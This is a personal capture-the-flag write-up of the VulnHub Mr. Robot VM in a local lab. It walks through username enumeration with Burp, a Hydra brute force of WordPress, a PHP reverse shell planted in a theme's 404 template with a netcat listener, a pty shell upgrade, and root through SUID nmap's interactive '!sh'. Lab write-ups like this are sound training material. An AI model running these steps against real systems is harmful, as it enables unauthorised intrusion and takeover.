# Mr. Robot — VulnHub/HTB Writeup

**Date:** August 2025    
**Difficulty:** Medium  
**Platform:** VulnHub (local VM setup)  
**Attacker Machine:** Kali Linux  
**Target Machine:** Mr. Robot VM  
**Flags captured:** 3/3 ✅

---

## Setup

Created a common internal network called `vulnerable_network` in VirtualBox, connecting two machines — Kali Linux (attacker) and the Mr. Robot VM (target).

Configured a new DHCP server on VirtualBox via CMD:

```bash
vboxmanage dhcpserver add --server-ip=192.160.10.10 \
--lower-ip=192.160.10.100 --upper-ip=192.160.10.110 \
--netmask=255.255.255.0 --enable
```

This created the internal DHCP network. Booted both machines — Kali got its IP automatically, but the Mr. Robot VM asked for credentials at boot so its IP wasn't visible directly.

---

## Step 1 — Reconnaissance

Since I knew the DHCP range was `192.160.10.100–110` and Kali was `.100`, I ran an nmap scan to find the target:

```bash
nmap -sS -T4 192.160.10.100-110
```

Found 1 live host — `192.160.10.101` — which was the Mr. Robot machine.

Opened `https://192.160.10.101` in Firefox, which loaded the Mr. Robot themed website. After exploring the site for a while, hit a dead end.

---

## Step 2 — Finding Key 1 + Wordlist

Checked `robots.txt` on the web server — found two files listed:
- `key-1-of-3.txt` → got the **first key** ✅
- `fsocity.dic` → a wordlist file, downloaded it for later use

---

## Step 3 — Username Enumeration (Burp Suite Intruder)

Navigated to the WordPress login page. Used **Burp Suite Intruder** to brute force the username:

- Cleared default payload positions, selected only the `uname` field
- Loaded `fsocity.dic` as the wordlist — but it had duplicates, so first cleaned it:

```bash
sort fsocity.dic | uniq > sorted.txt
```

- Loaded `sorted.txt` into Intruder and started the attack
- Went through responses — all lengths were identical except one
- A distinct reply appeared for the username **`Elliot`** — response said something like *"correct username but incorrect password"*
- **Username confirmed: Elliot** ✅

---

## Step 4 — Password Brute Force (Hydra)

Used Hydra to brute force the password against the WordPress login form:

```bash
hydra -L sorted.txt -p test 192.160.10.101 http-post-form \
'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

Once username was confirmed as Elliot, ran Hydra again targeting only the password:

```bash
hydra -l elliot -P sorted.txt 192.160.10.101 http-post-form \
'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
```

**Password found: ER28-0652** ✅

Logged into WordPress successfully.

---

## Step 5 — Getting a Reverse Shell

Inside WordPress admin panel:
- Went to **Appearance → Editor → 404 Template**
- Added a **reverse shell PHP payload**, changed the IP to Kali's IP and set port `443`
- On Kali, started a Netcat listener:

```bash
nc -lnvp 443
```

- Updated/saved the 404 template
- Triggered the 404 page — got a shell back on Netcat ✅

---

## Step 6 — Key 2 + Privilege Escalation to Robot

Navigated to `/home/robot` — found two files:
- `key-2-of-3.txt` — access denied (needed robot user permissions)
- `password.raw-md5` — contained a hashed password

Decoded the MD5 hash on **crackstation.net** — result was `abcd.....xyz` (a recognisable password).

To use `su - robot`, needed a proper TTY shell. Spawned one using Python:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

Then switched to the robot user:

```bash
su - robot
# password: abcd.....xyz
```

Now had access as robot — read the **second key** ✅

---

## Step 7 — Privilege Escalation to Root (Key 3)

Needed to escalate to root. Searched for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Saw **nmap** in the results — nmap with SUID is a known privilege escalation vector.

Used nmap's interactive mode to get a root shell:

```bash
nmap --interactive
```

Inside nmap interactive:

```bash
!sh
```

Got a root shell. Then:

```bash
cd /root
ls -h
```

Found and read the **third and final key** ✅

---

## Flags Summary

| Flag | Location | Method |
|------|----------|--------|
| Key 1 | `/robots.txt` → `key-1-of-3.txt` | Web enumeration |
| Key 2 | `/home/robot/key-2-of-3.txt` | MD5 crack + user switch |
| Key 3 | `/root/key-3-of-3.txt` | SUID nmap privilege escalation |

---

## Tools Used

- **nmap** — host discovery, port scanning
- **Burp Suite Intruder** — username enumeration
- **Hydra** — password brute force
- **Netcat** — reverse shell listener
- **Python pty** — TTY shell upgrade
- **crackstation.net** — MD5 hash cracking

---

## References

- YouTube walkthrough videos — used for guidance when stuck, particularly during the reverse shell and privilege escalation steps
- [crackstation.net](https://crackstation.net) — MD5 hash decoding

---

## What I Learned

- Always check `robots.txt` — it often leaks sensitive files
- WordPress login pages are vulnerable to username enumeration via response differences
- MD5 is not a secure hashing algorithm — easily cracked with online tools
- SUID binaries like nmap can be abused for privilege escalation — always check with `find / -perm -4000`
- Spawning a proper TTY shell is necessary before using `su`
- Methodical enumeration at every stage is more important than rushing to exploit
